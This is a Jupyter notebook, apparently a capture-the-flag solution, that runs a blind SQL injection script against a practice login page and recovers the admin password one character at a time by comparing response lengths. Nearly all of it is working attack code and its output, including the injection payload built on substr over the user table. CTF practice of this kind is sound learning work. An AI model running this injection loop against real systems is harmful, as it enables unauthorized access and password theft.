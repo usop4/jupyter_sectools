{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pycurl in /home/nbuser/anaconda3_501/lib/python3.6/site-packages (7.43.0)\n",
      "\u001b[31mgrpcio 1.11.0 has requirement protobuf>=3.5.0.post1, but you'll have protobuf 3.4.1 which is incompatible.\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "!pip install pycurl"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "__\n",
      "_ABCDEFGHIJKL_L\n",
      "_A_LA\n",
      "_ABCDEFG_LAG\n",
      "__LAG_\n",
      "_ABCDEFGHIJK_LAG_K\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop_LAG_Kp\n",
      "_ABCDEFGHIJKLMNOPQRSTUVW_LAG_KpW\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZa_LAG_KpWa\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234_LAG_KpWa4\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij_LAG_KpWa4j\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghi_LAG_KpWa4ji\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123_LAG_KpWa4ji3\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstu_LAG_KpWa4ji3u\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZ_LAG_KpWa4ji3uZ\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk_LAG_KpWa4ji3uZk\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456_LAG_KpWa4ji3uZk6\n",
      "_ABCDEFGHIJKLMNOPQRST_LAG_KpWa4ji3uZk6T\n",
      "_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr_LAG_KpWa4ji3uZk6Tr\n",
      "_ABCDEFGHIJKLMNOP_LAG_KpWa4ji3uZk6TrP\n",
      "_ABCDEFGHIJK_LAG_KpWa4ji3uZk6TrPK\n"
     ]
    }
   ],
   "source": [
    "import pycurl\n",
    "import time\n",
    "from io import BytesIO\n",
    "\n",
    "ch = '_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'\n",
    "passwd = ''\n",
    "for i in range(1,22):\n",
    "    for c in ch:\n",
    "        print(c, end=\"\")\n",
    "        sql = \"admin' AND substr((SELECT pass FROM user WHERE id='admin'), {0}, 1)='{1}';--\".format(i,c)\n",
    "        #print(sql, end=\"\")\n",
    "        curl = pycurl.Curl()\n",
    "        curl.setopt(curl.URL, 'http://ctfq.sweetduet.info:10080/~q6/')\n",
    "        curl.setopt(curl.WRITEDATA, buffer)\n",
    "        curl.setopt(pycurl.POST, 1)\n",
    "        curl.setopt(pycurl.HTTPPOST, [('id', sql),('pass', '')])        \n",
    "        curl.perform()\n",
    "        curl.close()\n",
    "\n",
    "        body = buffer.getvalue()\n",
    "        buffer = BytesIO()\n",
    "        if len(body) > 577:\n",
    "            passwd = passwd + c\n",
    "            print(passwd)\n",
    "            break\n",
    "        time.sleep(0.01)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.6",
   "language": "python",
   "name": "python36"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
